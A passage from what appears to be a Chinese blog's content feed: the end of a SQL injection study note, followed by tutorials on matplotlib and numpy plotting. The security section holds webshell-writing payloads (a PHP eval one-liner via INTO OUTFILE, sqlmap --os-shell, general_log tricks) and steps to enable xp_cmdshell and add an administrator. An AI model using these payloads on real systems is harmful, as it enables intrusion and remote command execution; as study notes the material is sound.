alt="image-20210425194416463"></p><h4 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h4><p><img src="https://i.loli.net/2021/04/25/9XQNd6ziu2qKYsc.png" alt="image-20210425194549389"></p><h4 id="时间型盲注"><a href="#时间型盲注" class="headerlink" title="时间型盲注"></a>时间型盲注</h4><p>（1）时间型盲注与布尔型盲注的语句构造过程类似，通常在布尔型盲注表达式的基础上<strong>使用IF语句加入延时语句来构造，</strong>由于时间型盲注耗时较大，通常利用脚本工具来执行，在手工利用的过程中较少使用。</p><p><img src="https://i.loli.net/2021/04/25/kXfIo6OZPv9malA.png" alt="image-20210425194748742"></p><p>（2）说明：</p><ul><li>通常使用sleep()等专用的延时函数来进行时间盲注，特殊情况下也可以使用某些耗时较高的操作代替这些函数。</li><li>为了提高效率，通常在表达式判断为真时执行延时语句。</li><li>时间盲注语句拼接时无特殊要求，保证语法正确即可。</li></ul><h2 id="SQL注入利用-读写文件"><a href="#SQL注入利用-读写文件" class="headerlink" title="SQL注入利用-读写文件"></a>SQL注入利用-读写文件</h2><p>（1）读写权限判断</p><ul><li>关键函数</li><li>关键值</li></ul><p>（2）绝对路径获取：基于报错信息</p><p>（3）文件读取/写入</p><ul><li>文件读取函数</li><li>文件写入函数</li></ul><h3 id="读写文件基础知识"><a href="#读写文件基础知识" class="headerlink" title="读写文件基础知识"></a>读写文件基础知识</h3><p>（1）Windows下：修改my.ini在[mysqld]内加入secure_file_priv=</p><p>Linux下：修改my.cnf在[mysqld]内加入secure_file_priv=</p><p>（2）然后重启mysql，再查询secure_file_priv</p><pre><code>show variables like &#39;%secure%&#39;;//若secure_file_priv值为null，表示限制mysqld不允许导入/导出//值为/tmp/，表示限制mysqld的导入/导出只能发生在/tmp/目录下//若secure_file_priv值没有具体值时，表示不对mysqld的导入/导出做限制。</code></pre><p>（3）读文件：select load_file(“xxx”)</p><p>写文件：select xxx into outfile、select xxx into dumpfile。outfile可以写入多行，dumpfile只能写入一行。</p><p>利用SQL注入写入一句话木马。需要知道网站的绝对路径（phpinfo\报错页面\Apache默认页面\目录遍历漏洞。</p><pre><code class="sql">select &quot;&lt;?php @eval($_POST[cmd]);?&gt;&quot; into outfile &quot;D:\\flag.php&quot;;  -- widows下路径要加双斜杠，第一个斜杠表示转义</code></pre><h2 id="SQL注入利用-执行命令"><a href="#SQL注入利用-执行命令" class="headerlink" title="SQL注入利用-执行命令"></a>SQL注入利用-执行命令</h2><p>（1）当数据库是<strong>SQL SERVER</strong>的时候可以利用xp_cmdshell存储过程执行系统命令。在数据库中需要执行以下语句开启xp_cmdshell存储过程。</p><pre><code>EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;</code></pre><p><img src="https://i.loli.net/2021/04/25/AdeurYM6LOmqEZv.png" alt="image-20210425200005888"></p><p>（2）开启之后使用xp_cmdshell可以执行系统命令，如下图所示使用该存储过程可以添加一个管理员组的用户</p><h2 id="扩展："><a href="#扩展：" class="headerlink" title="扩展："></a>扩展：</h2><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h2 id="SQL注入写马"><a href="#SQL注入写马" class="headerlink" title="SQL注入写马"></a>SQL注入写马</h2><p><strong>大前提：需要知道网站的绝对路径（phpinfo\报错页面\Apache默认页面\目录遍历漏洞。</strong></p><h3 id="利用SQLMAP写马"><a href="#利用SQLMAP写马" class="headerlink" title="利用SQLMAP写马"></a>利用SQLMAP写马</h3><p>payload：</p><pre><code>sqlmap -u &quot;URL&quot; -c &quot;Cookie&quot; --file-write &quot;Content&quot; --file-dest &quot;Path&quot;sqlmap -u &quot;URL&quot; -c &quot;Cookie&quot; --os--shell</code></pre><h3 id="利用语句写马"><a href="#利用语句写马" class="headerlink" title="利用语句写马"></a>利用语句写马</h3><p>前提：secure_file_priv变量值不为NULL，为网站根目录</p><p>MySQL版本：</p><pre><code>MySQL&lt;5.6.34：secure_file_priv可以使用set global secure_file_priv=&quot;path&quot;修改MySQL&gt;5.6.34：secure_file_priv不可以使用set global secure_file_priv=&quot;path&quot;修改，且参数默认值为NULL</code></pre><p>payload：</p><pre><code>id=-1&#39; union select &quot;Contents&quot; into outfile &quot;Paht&quot;id=-1&#39; union select &quot;Contents&quot; into dumpfile &quot;Path&quot;id=1&#39; into outfile &#39;Path&#39; lines terminated by &#39;Contents&#39; --+select * from admin where id=&#39;1&#39; into outfile &#39;path&#39; lines terminated by &#39;contents&#39;id=1&#39; limit 1 into outfile &#39;Path&#39; lines terminated by &#39;Contents&#39; --+</code></pre><p>tips：</p><pre><code>outfile可以写入多行数据，并且字段和行终止符都可以作为格式输出。dumpfile只能写一行，并且输出中不存在任何格式。</code></pre><h3 id="利用日志写马"><a href="#利用日志写马" class="headerlink" title="利用日志写马"></a>利用日志写马</h3><pre><code>set global general_log=&quot;ON&quot;set global general_log_file=&quot;Path&quot;union select 查询</code></pre><p>过滤：preg_match正则匹配 </p><pre><code>preg_match(&#39;unon&#39;,$sql)&#123;&#125;</code></pre><p>编码：宽字节注入</p><p>预编译：mysqli_pdo</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>运用Python语言(四)-科学计算和可视化02</title>
      <link href="2021/04/16/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E5%9B%9B)-%E7%A7%91%E5%AD%A6%E8%AE%A1%E7%AE%97%E5%92%8C%E5%8F%AF%E8%A7%86%E5%8C%9602/"/>
      <url>2021/04/16/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E5%9B%9B)-%E7%A7%91%E5%AD%A6%E8%AE%A1%E7%AE%97%E5%92%8C%E5%8F%AF%E8%A7%86%E5%8C%9602/</url>
      
        <content type="html"><![CDATA[<h2 id="matplotlib库的使用"><a href="#matplotlib库的使用" class="headerlink" title="matplotlib库的使用"></a>matplotlib库的使用</h2><p><strong>matplotlib是提供数据绘图功能的第三方库，其pyplot子库主要用于实现各种数据展示图形的绘制</strong></p><h3 id="matplotlib-pyplot库概述"><a href="#matplotlib-pyplot库概述" class="headerlink" title="matplotlib.pyplot库概述"></a>matplotlib.pyplot库概述</h3><p>（1）matplotlib.pyplot是matplotlib的子库，引用方式如下：</p><pre><code class="python">&gt;&gt;&gt;import matplotlib.pyplot as plt #后续程序中，plt将代替matplotlib.pyplot</code></pre><p>（2）为了正确显示中文字体，使用以下代码更改默认设置，其中’SimHei’表示黑体字。</p><pre><code class="python">&gt;&gt;&gt; import matplotlib&gt;&gt;&gt; matplotlib.rcParams[&#39;font.family&#39;]=&#39;SimHei&#39;&gt;&gt;&gt; matplotlib.rcParams[&#39;font.sans-serif&#39;] = [&#39;SimHei&#39;]</code></pre><p>（3）字体名称的中英文对照</p><table><thead><tr><th align="center">字体名称</th><th align="center">字体英文表示</th></tr></thead><tbody><tr><td align="center">宋体</td><td align="center">SimSun</td></tr><tr><td align="center">黑体</td><td align="center">SimHei</td></tr><tr><td align="center">楷体</td><td align="center">KaiTi</td></tr><tr><td align="center">微软雅黑</td><td align="center">Microsoft YaHei</td></tr><tr><td align="center">隶书</td><td align="center">LiSu</td></tr><tr><td align="center">仿宋</td><td align="center">FangSong</td></tr><tr><td align="center">幼圆</td><td align="center">YouYuan</td></tr><tr><td align="center">华文宋体</td><td align="center">STSong</td></tr><tr><td align="center">华文黑体</td><td align="center">STHeiti</td></tr><tr><td align="center">苹果丽中黑</td><td align="center">Apple LiGothic Medium</td></tr></tbody></table><p>（4）matplotlib库由一系列有组织有隶属关心的对象构成，对于基础绘图操作来说过于复杂。因此matplotlib提供了一套快捷命令式的绘图接口函数，<strong>即pyplot子模块</strong>。</p><p>（5）pyplot将绘图所需要的对象构建过程封装在函数中，对用户提供了更加友好的接口。pyplot模块提供一批预定义的绘图函数，大多数函数可以从函数名辨别它的功能。</p><h3 id="matplotlib-pyplot库解析"><a href="#matplotlib-pyplot库解析" class="headerlink" title="matplotlib.pyplot库解析"></a>matplotlib.pyplot库解析</h3><p>（1）以下内容使用plt代替matplotlib.pyplot。plt子库提供了一批操作和绘图函数，每个函数代表对图像进行的一个操作，比如创建绘图区域、添加标注或修改坐标轴等。这些函数采用了plt.&lt;b&gt;()形式调用，其中&lt;b&gt;是具体函数名称。</p><p>（2）plt子库中包含了4个与绘图区域有关的函数，如下表所示。</p><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">plt.figure(figsize=None,facecolor=None)</td><td align="center">创建一个全局绘图区域</td></tr><tr><td align="center">plt.axes(rect,axisbg=’w’)</td><td align="center">创建一个坐标系风格的子绘图区域，axisbg指背景色，默认为white</td></tr><tr><td align="center">plt.subplot(nrows,ncols,plot_number)</td><td align="center">在全局绘图区域中创建一个子绘图区域</td></tr><tr><td align="center">plt.subplots_adjust()</td><td align="center">调整子绘图区域的布局</td></tr></tbody></table><p>（3）使用figure()函数创建一个全局绘图区域，并且使它成为当前的绘图对象，<strong>figsize参数可以指定绘图区域的宽度和高度，单位为英寸。</strong>鉴于figure()函数参数较多，这里采用指定参数名称的方式输入参数。</p><pre><code class="python">plt.figure(figsize(8,4))</code></pre><p>（4）绘制图像之前也不可调用figure()函数创建全局绘图区域，此时，plt子库会自动创建一个默认的绘图区域。显示绘图区域的代码如下：</p><pre><code class="python">&gt;&gt;&gt;plt.figure(figsize(8,4))&gt;&gt;&gt;plt.show()</code></pre><p>（5）<strong>subplot()**用于在全局绘图区域内创建子绘图区域，其参数表示将全局绘图区域分成</strong>nrows行和ncols列<strong>，并根据</strong>先行后列的计数方式**在plot_number位置生成一个坐标系。例如：</p><pre><code class="python">&gt;&gt;&gt; plt.subplot(324)    #全局绘图区域被分割成3*2的表格，其中，在第4个位置绘制了一个坐标系。&gt;&gt;&gt; plt.show()</code></pre><p><img src="https://i.loli.net/2021/04/17/eDwWkaCUdbRng2I.png" alt="image-20210417102315753"></p><p>（6）axes()默认创建一个subplot(111)坐标系，参数rect=[left,bottom,width,height]中<strong>4个变量的范围都为[0,1]，</strong>表示坐标系与全局绘图区域的关系；axisbg指背景色，默认为white。</p><pre><code class="python">&gt;&gt;&gt; plt.axes([0.1,0.1,0.7,0.3], axisbg=&#39;y&#39;)&gt;&gt;&gt; plt.show()</code></pre><p>（7）plt子库提供了一组读取和显示相关的函数，用于在绘图区域中增加显示内容及读入数据，这些函数需要与其他函数搭配使用，如下表所示</p><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">plt.legend()</td><td align="center">在绘图区域中放置绘图标签（也称图注）</td></tr><tr><td align="center">plt.show()</td><td align="center">显示创建的绘图对象</td></tr><tr><td align="center">plt.matshow()</td><td align="center">在窗口显示数组矩阵</td></tr><tr><td align="center">plt.imshow()</td><td align="center">在axes上显示图像</td></tr><tr><td align="center">plt.imsave()</td><td align="center">保存数组为图像文件</td></tr><tr><td align="center">plt.imread()</td><td align="center">从文件图像中读取数组</td></tr></tbody></table><p>（8）pyplot模块提供了17个用于绘制“基础图表”的常用函数，如下表所示</p><table><thead><tr><th align="center">操作</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><strong>plt.plot(x,y,label,color,width)</strong></td><td align="center">根据x，y数组绘制直、曲线</td></tr><tr><td align="center">plt.boxplot(data,notch,position)</td><td align="center">绘制一个箱型图</td></tr><tr><td align="center">plt.bar(left,height,width,bottom)</td><td align="center">绘制一个条形图</td></tr><tr><td align="center">plt.barh(bottom,width,height,left)</td><td align="center">绘制一个横向条形图</td></tr><tr><td align="center">plt.polar(theta,r)</td><td align="center">绘制极坐标图</td></tr><tr><td align="center">plt.pie(data,explode)</td><td align="center">绘制饼图</td></tr><tr><td align="center">plt.psd(x,NFFT=256,pad_to,Fs)</td><td align="center">绘制功率谱密度图</td></tr><tr><td align="center">plt.specgram(x,NFFT=256,pad_to,F)</td><td align="center">绘制谱图</td></tr><tr><td align="center">plt.cohere(x,y,NFFT=256,Fs)</td><td align="center">绘制X-Y的相关性函数</td></tr><tr><td align="center">plt.scatter()</td><td align="center">绘制散点图(x,y是长度相同的序列)</td></tr><tr><td align="center">plt.step(x,y,where)</td><td align="center">绘制步阶图</td></tr><tr><td align="center">plt.hist(x,bins,normed)</td><td align="center">绘制直方图</td></tr><tr><td align="center">plt.contour(X,Y,Z,N)</td><td align="center">绘制等值线</td></tr><tr><td align="center">plt.vlines()</td><td align="center">绘制垂直线</td></tr><tr><td align="center">plt.stem(x,y,linefmt,markerfmt,basefmt)</td><td align="center">绘制曲线每个点到水平轴线的垂线</td></tr><tr><td align="center">plt.plot_data()</td><td align="center">绘制数据日期</td></tr><tr><td align="center">plt.plotfile()</td><td align="center">绘制数据后写入文件</td></tr></tbody></table><p>（9）plot()函数是用于绘制直线的最基础的函数，调用方式灵活，x和y可以是numpy计算出的数组，并用关键字参数指定各种属性。其中，labe表示设置标签并在图例中显示，color表示曲线的颜色，linewidth表示曲线的宽度。<strong>在字符串前后添加$符号，matplotlib会使用其内置的latex引擎绘制数学公式。</strong></p><p>（10）实例：在坐标系中绘制基本的三角函数</p><pre><code class="python">import numpy as npimport matplotlib.pyplot as pltx = np.linspace(0, 6, 100)y = np.cos(2 * np.pi * x) * np.exp(-x)+0.8plt.plot(x,y,&#39;k&#39;,color=&#39;r&#39;,linewidth=3,linestyle=&quot;-&quot;)plt.show()</code></pre><p><img src="https://i.loli.net/2021/04/17/MGgRwy7FZj2orLb.png" alt="image-20210417111653192"></p><p>（11）plt库有两个坐标体系，<strong>图像坐标和数据坐标。</strong></p><ul><li>图像坐标将图像所在区域左下角视为原点，将x方向和y方向长度设定为1。整体绘图区域有一个图像坐标，每个axes()和subplot()函数产生的子图也有属于自己的图像坐标。**axes()函数参数rect指当前产生的子区域相对于整个绘图区域的图像坐标。</li><li>数据坐标以当前绘图区域的坐标轴为参考，显示每个点的相对位置，这与坐标系里面标记数据点一致。</li></ul><p>（12）下表给出了与plt库的坐标轴设置相关的函数</p><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">plt.axis(‘v’,’off’,’equal’,’scaled’,’tight’,’image’)</td><td align="center">获取设置轴属性的快捷方法</td></tr><tr><td align="center">plt.xlim(xmin,xmax)</td><td align="center">设置当前x轴取值范围</td></tr><tr><td align="center">plt.ylim(ymin,ymax)</td><td align="center">设置当前y轴取值范围</td></tr><tr><td align="center">plt.xscale()</td><td align="center">设置x轴缩放</td></tr><tr><td align="center">plt.yscale()</td><td align="center">设置y轴缩放</td></tr><tr><td align="center">plt.autoscale()</td><td align="center">自动缩放轴视图的数据</td></tr><tr><td align="center">plt.text(x,y,s,fontdic,withdash)</td><td align="center">为axes图轴添加注释</td></tr><tr><td align="center">plt.thetagrids(angles,labels,fmt,frac)</td><td align="center">设置极坐标网络theta的位置</td></tr><tr><td align="center">plt.grid(on/off)</td><td align="center">打开或者关闭坐标网络</td></tr></tbody></table><pre><code class="python">&gt;&gt;&gt; plt.plot([1,2,4],[1,2,3])&gt;&gt;&gt; plt.axis()   #获得当前坐标轴范围(0.85, 4.15, 0.9, 3.1)&gt;&gt;&gt; plt.axis([0,5,0,8]) #4个变量分别是[xmin,xmax,ymin,ymax]&gt;&gt;&gt; plt.show()</code></pre><p><img src="https://i.loli.net/2021/04/17/ZP32HJmWCGBtkSQ.png" alt="image-20210417113325710"></p><p>（13）下表给出了13个设置坐标系标签的相关函数</p><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">plt.figlegend(handles,label,loc)</td><td align="center">为全局绘图区域放置图注</td></tr><tr><td align="center">plt.legend()</td><td align="center">为当前坐标图放置图注</td></tr><tr><td align="center">plt.xlabel(s)</td><td align="center">设置当前x轴的标签</td></tr><tr><td align="center">plt.ylabel(s)</td><td align="center">设置当前y轴的标签</td></tr><tr><td align="center">plt.xticks(array,’a’,’b’,’c’)</td><td align="center">设置当前x轴刻度位置的标签和值</td></tr><tr><td align="center">plt.yticks(array,’a,’b’,’c’)</td><td align="center">设置当前y轴刻度位置的标签和值</td></tr><tr><td align="center">plt.clabel(cs,v)</td><td align="center">为等值线图设置标签</td></tr><tr><td align="center">plt.get_figlabels()</td><td align="center">返回当前绘图区域的标签列表</td></tr><tr><td align="center">plt.figtext(x,y,s,fontdic)</td><td align="center">为全局绘图区域添加文字</td></tr><tr><td align="center">plt.title()</td><td align="center">设置标题</td></tr><tr><td align="center">plt.suptitle()</td><td align="center">为当前绘图区域添加中心标题</td></tr><tr><td align="center">plt.text(x,y,fontdic,withdash)</td><td align="center">为坐标图轴添加注释</td></tr><tr><td align="center">plt.annotate(note,xy,xytext,xycoords,textcoords,arrowprops)</td><td align="center">用箭头在指定数据点创建一个注释或一段文本</td></tr></tbody></table><p>（14）绘制一个带标签的坐标系</p><pre><code class="python">import matplotlib.pyplot as pltimport matplotlibmatplotlib.rcParams[&#39;font.family&#39;]=&#39;SimHei&#39;matplotlib.rcParams[&#39;font.sans-serif&#39;]=[&#39;SimHei&#39;]plt.plot([1,2,4],[1,2,3])plt.title(&quot;坐标系标题&quot;)plt.xlabel(&#39;时间(s)&#39;)plt.ylabel(&#39;范围(m)&#39;)plt.xticks([1,2,3,4,5],[r&#39;$\pi/3$&#39;,r&#39;$2\pi/3$&#39;,r&#39;$\pi$&#39;,\                        r&#39;$4\pi/3$&#39;,r&#39;$5\pi/3$&#39;])plt.show()</code></pre><p><img src="https://i.loli.net/2021/04/17/KRIyBVuktdjeqJY.png" alt="image-20210417125952062"></p><p>（15）plt库提供了3个区域填充函数，对绘图区域填充颜色，如下表示所示</p><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">fill(x,y,c,color)</td><td align="center">填充多边形</td></tr><tr><td align="center">fill_between(x,y1,y2,where,color)</td><td align="center">填充两条曲线围成的多边形</td></tr><tr><td align="center">fill_betweenx(y,x1,x2,where,hold)</td><td align="center">填充两条水平线之间的区域</td></tr></tbody></table><p>（16）绘制一个带局部阴影的坐标系。</p><pre><code class="python">import matplotlib.pyplot as pltimport numpy as npx = np.linspace(0,10,1000)y = np.cos(2*np.pi*x) * np.exp(-x)+0.8plt.plot(x,y,&#39;k&#39;,color=&#39;r&#39;,label=&quot;$exp-decay$&quot;,linewidth=3)plt.axis([0,6,0,1.8])ix = (x&gt;0.8) &amp; (x&lt;3)plt.fill_between(x,y,0,where=ix,\                 facecolor=&#39;gray&#39;,alpha=0.25)plt.text(0.5*(0.8+3),0.2,r&quot;$\int_a^b f(x)\mathrm&#123;d&#125;x$&quot;,\         horizontalalignment=&#39;center&#39;)plt.legend()plt.show()</code></pre><p><img src="https://i.loli.net/2021/04/17/8znfgdYXk9KUowq.png" alt="image-20210417131059448"></p><h2 id="实例：科学坐标图绘制"><a href="#实例：科学坐标图绘制" class="headerlink" title="实例：科学坐标图绘制"></a>实例：科学坐标图绘制</h2><p>（1）科学坐标图有4个要素：<strong>坐标轴、数据曲线、标题和图注</strong>。本实例以阻尼衰减曲线绘制来具体阐述科学坐标系的绘制方法。</p><p>（2）本实例同时展示了在同一个区域用不同颜色和线条绘制两种曲线的方法，两条曲线分别为(x,y)和(x,z)。</p><pre><code class="python">x = np.linspace(0.0, 6.0, 100)y = np.cos(2*np.pi*x) * np.exp(-x)+0.8z = 0.5 * np.cos(x ** 2)+0.8</code></pre><pre><code class="python">import numpy as npimport matplotlib.pyplot as pltimport matplotlibmatplotlib.rcParams[&#39;font.family&#39;]=&#39;SimHei&#39;matplotlib.rcParams[&#39;font.sans-serif&#39;]=[&#39;SimHei&#39;]def Draw(pcolor, nt_point, nt_text, nt_size):   #Draw()函数用于绘制曲线    plt.plot(x,y,&#39;k&#39;,label=&quot;$exp_decay$&quot;,color=pcolor,\  #根据x、y数组绘制直、曲线             linewidth=3, linestyle=&#39;-&#39;)    plt.plot(x,z,&quot;b--&quot;,label=&quot;$cos(x^2)$&quot;, linewidth=1)    plt.xlabel(&#39;时间(s)&#39;)    plt.ylabel(&#39;幅度(mV)&#39;)    plt.title(&#39;阻尼衰减曲线绘制&#39;)    plt.annotate(&#39;$\cos(2 \pi t) \exp(-t)$&#39;,xy=nt_point,\   #用箭头在指定数据点创建一个注释或一段文本                 xytext=nt_text,fontsize=nt_size,arrowprops= \                 dict(arrowstyle=&#39;-&gt;&#39;, connectionstyle=&quot;arc3,rad=.1&quot;))def Shadow(a,b):                             #Shadow()函数用于设置阴影    ix = (x&gt;a) &amp; (x&lt;b)    plt.fill_between(x,y,0,where=ix,facecolor=&#39;gray&#39;,alpha=0.25)    plt.text(0.5*(a+b),0.2,r&quot;$\int_a^b f(x)\mathrm&#123;d&#125;x$&quot;,\             horizontalalignment=&#39;center&#39;)def XY_Axis(x_start, x_end, y_start, y_end): #XY_Axis()函数用于修改坐标轴    plt.xlim(x_start,x_end)   #设置当前x轴的取值范围    plt.ylim(y_start,y_end)    plt.xticks([np.pi/3,2 * np.pi/3, 1*np.pi, 4*np.pi/3,\     #设置当前x轴刻度位置的标签和值                5*np.pi/3],[&#39;$\pi/3$&#39;,&#39;$2\pi/3$&#39;,&#39;$\pi$&#39;,&#39;$4\pi/3$&#39;,&#39;$5\pi/3$&#39;])x = np.linspace(0.0, 6.0, 100)      #创建一个由0.0到6.0，等分成100个元素的数组y = np.cos(2 * np.pi * x) * np.exp(-x)+0.8z = 0.5 * np.cos(x ** 2)+0.8note_point,note_text,note_size=(1,np.cos(2*np.pi)*\                                np.exp(-1)+0.8),(1,1.4), 14fig = plt.figure(figsize=(8, 6),facecolor=&quot;white&quot;)   #创建一个全局绘图区域plt.subplot(111)                                     #在全局绘图区域中创建一个子绘图区域Draw(&quot;red&quot;,note_point,note_text,note_size)XY_Axis(0,5,0,1.8)Shadow(0.8,3)plt.legend()               #为当前坐标图放置图注plt.savefig(&#39;sample.JPG&#39;)  #将产生的坐标图保存为文件plt.show()</code></pre><p><img src="https://i.loli.net/2021/04/17/yhvMBaQ2HW8e7PU.png" alt="image-20210417190906901"></p><p>（3）其中第13行的annotate()函数配合箭头在曲线绘图界面添加动态注释，箭头的线条和尖端都有多种样式和参数，可以通过arrowprops和connetionstyle选择，具体可参考官方文档。</p><h2 id="实例：多级雷达图绘制"><a href="#实例：多级雷达图绘制" class="headerlink" title="实例：多级雷达图绘制"></a>实例：多级雷达图绘制</h2><h3 id="单一数据雷达图"><a href="#单一数据雷达图" class="headerlink" title="单一数据雷达图"></a>单一数据雷达图</h3><p>（1）雷达图是通过多个离散属性比较对象的最直观工具。</p><pre><code class="python">import numpy as npimport matplotlib.pyplot as pltimport matplotlibmatplotlib.rcParams[&#39;font.family&#39;]=&#39;SimHei&#39;       #第3行到第5用于支持中文matplotlib.rcParams[&#39;font.sans-serif&#39;]=[&#39;SimHei&#39;]labels = np.array([&#39;综合&#39;,&#39;KDA&#39;,&#39;发育&#39;,&#39;推进&#39;,&#39;生存&#39;,&#39;输出&#39;]) #设置属性标签，包含6个属性nAttr = 6data = np.array([7, 5, 6, 9, 8, 7]) #预设一组玩家数据值angles = np.linspace(0, 2*np.pi, nAttr, endpoint=False)data = np.concatenate((data, [data[0]]))    #对data进行封闭angles = np.concatenate((angles, [angles[0]]))   #对angles进行封闭labels=np.concatenate((labels,[labels[0]]))    #对labels进行封闭，若不对此进行封闭则会报错fig = plt.figure(facecolor=&quot;white&quot;)plt.subplot(111, polar=True)     #在全局绘图区域中创建一个子绘图区域plt.plot(angles,data,&#39;bo-&#39;,color = &#39;g&#39;,linewidth=2)plt.fill(angles,data,facecolor=&#39;g&#39;,alpha=0.25)plt.thetagrids(angles*180/np.pi,labels)plt.figtext(0.52, 0.95, &#39;DOTA能力值雷达图&#39;,ha=&#39;center&#39;)    #为全局绘图区域添加文字plt.grid(True)plt.savefig(&#39;dota_radar.JPG&#39;)plt.show()</code></pre><p><img src="https://i.loli.net/2021/04/17/zpKIPkvLClZGeT8.png" alt="image-20210417215652944"></p><p>（2）np.linspace()函数设定起点为0、末值为2π、返回一个两端点间数值平均分布的长为nAttr的数组angles，<strong>它表示从一个属性点到下一个属性点笔画需要旋转的角</strong>度，它取决于属性<strong>nAttr的大小，也是雷达图的多边形边数。</strong></p><p>（3）np.concatenate()函数用于将数据和角度的数组首尾闭合起来，便于调用plot()函数绘制。</p><p>（4）建立基本绘图对象后，使用subplot()函数建立极坐标系的子分区。<strong>polar参数指定了绘制类型为极坐标</strong>，这是subplot()除默认正方形坐标系外唯一支持的内置坐标图。</p><p>（5）建立极坐标后，使用plot()函数依照data提供的数据画出不规则六边形，然后使用fill()函数填充半透明颜色。</p><p>（6）thetagrids()函数为极坐标设置标签，这里把标签放在六角形的顶点上，需要将角度数据和文字一起作为参数传给thetagrids函数。</p><h3 id="多数据雷达图"><a href="#多数据雷达图" class="headerlink" title="多数据雷达图"></a>多数据雷达图</h3><p><strong>霍兰德人格分析雷达图</strong></p><pre><code class="python">import numpy as npimport matplotlib.pyplot as pltimport matplotlibmatplotlib.rcParams[&#39;font.family&#39;]=&#39;SimHei&#39;matplotlib.rcParams[&#39;font.sans-serif&#39;] = [&#39;SimHei&#39;]radar_labels = np.array([&#39;研究型(I)&#39;,&#39;艺术型(A)&#39;,&#39;社会型(S)&#39;,\                         &#39;企业型(E)&#39;,&#39;常规型(C)&#39;,&#39;现实型(R)&#39;])nAttr = 6data = np.array([[0.40, 0.32, 0.35, 0.30, 0.30, 0.88],                 [0.85, 0.35, 0.30, 0.40, 0.40, 0.30],                 [0.43, 0.89, 0.30, 0.28, 0.22, 0.30],                 [0.30, 0.25, 0.48, 0.85, 0.45, 0.40],                 [0.20, 0.38, 0.87, 0.45, 0.32, 0.28],                 [0.34, 0.31, 0.38, 0.40, 0.92, 0.28]]) #数据值data_labels=(&#39;工程师&#39;,&#39;实验员&#39;,&#39;艺术家&#39;,&#39;推销员&#39;,&#39;社会工作者&#39;,&#39;记事员&#39;)angles = np.linspace(0, 2*np.pi, nAttr, endpoint=False)data = np.concatenate((data,[data[0]]))angles = np.concatenate((angles,[angles[0]]))radar_labels = np.concatenate((radar_labels,[radar_labels[0]]))fig = plt.figure(facecolor=&quot;white&quot;)plt.subplot(111,polar=True)#plt.plot(angles,data,&#39;bo-&#39;, color=&#39;gray&#39;,linewidth=1,alpha=0.2)plt.plot(angles,data,&#39;o-&#39;,linewidth=1.5,alpha=0.2)plt.fill(angles,data,alpha=0.25)plt.thetagrids(angles*180/np.pi, radar_labels)plt.figtext(0.52,0.95,&#39;霍兰德人格分析&#39;, ha=&#39;center&#39;, size=20)legend=plt.legend(data_labels,loc=(0.94,0.80),labelspacing=0.1) #为当前坐标图放置图注plt.setp(legend.get_texts(),fontsize=&#39;small&#39;)plt.grid(True)plt.savefig(&#39;holland_radar.JPG&#39;)plt.show()</code></pre><p><img src="https://i.loli.net/2021/04/18/apjLAPcXIixFnqy.png" alt="image-20210418141558700"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>运用Python语言(三)-科学计算和可视化01</title>
      <link href="2021/04/10/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E4%B8%89)-%E7%A7%91%E5%AD%A6%E8%AE%A1%E7%AE%97%E5%92%8C%E5%8F%AF%E8%A7%86%E5%8C%9601/"/>
      <url>2021/04/10/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E4%B8%89)-%E7%A7%91%E5%AD%A6%E8%AE%A1%E7%AE%97%E5%92%8C%E5%8F%AF%E8%A7%86%E5%8C%9601/</url>
      
        <content type="html"><![CDATA[<h2 id="问题概述"><a href="#问题概述" class="headerlink" title="问题概述"></a>问题概述</h2><p><strong>科学计算需要采用矩阵运算库numpy和绘制库matplotlib。</strong></p><p>（1）开展基本的科学计算需要两个步骤：组织数据和展示数据。</p><ul><li>组织数据是运算的基础，也是<strong>将客观世界数字化</strong>的必要手段。</li><li>展示数据是<strong>体现运算结果</strong>的重要方式，也是展示结论的有力武器。</li></ul><p>（2）科学计算以<strong>矩阵</strong>而不是单一数值为基础，增加了计算密度，能够表达更为复杂的数据运算逻辑。</p><p>（3）矩阵有维度概念，一维矩阵是线性的，类似于列表，二维矩阵是表格状的，这是常用的数据表示形式。</p><h2 id="numpy库的使用"><a href="#numpy库的使用" class="headerlink" title="numpy库的使用"></a>numpy库的使用</h2><p><strong>numpy是用于处理含有同种元素的多维数组运算的第三方库</strong></p><h3 id="numpy库概述"><a href="#numpy库概述" class="headerlink" title="numpy库概述"></a>numpy库概述</h3><p>（1）Python标准库中提供了一个array类型，用于保存数组类型数据，然而这个类型不支持多维数据，处理函数也不够丰富，不适合数值运算。因此，第三方库numpy得到了迅速发展，至今，<strong>numpy已经成为了科学计算事实上的标准库</strong>。</p><p>（2）<strong>numpy库处理的最基础数据类型是由同种元素构成的多维数组</strong>。数组中所有元素的类型必须相同，数组中元素可以用整数索引，序号从0开始。</p><p>（3）ndarray类型的维度叫做轴（axes），轴的个数叫做秩（rank）。一维数组的秩为1，二维数组的秩为2，二维数组相当于由两个一维数组构成。</p><p>（4）由于numpy库中函数较多且命名容易与常用名混淆，建议采用如下方式引用numpy库：</p><pre><code class="python">import numpy as np#as保留字与import一起使用能够改变后续代码中库的命名空间，有助于提高代码的可读性。简单地说，在程序的后续部分，np代替numpy</code></pre><h3 id="numpy库解析"><a href="#numpy库解析" class="headerlink" title="numpy库解析"></a>numpy库解析</h3><p>（1）numpy库常用的创建数组（ndarray类型）函数有7个，如下表所示</p><table><thead><tr><th align="center">函数</th><th 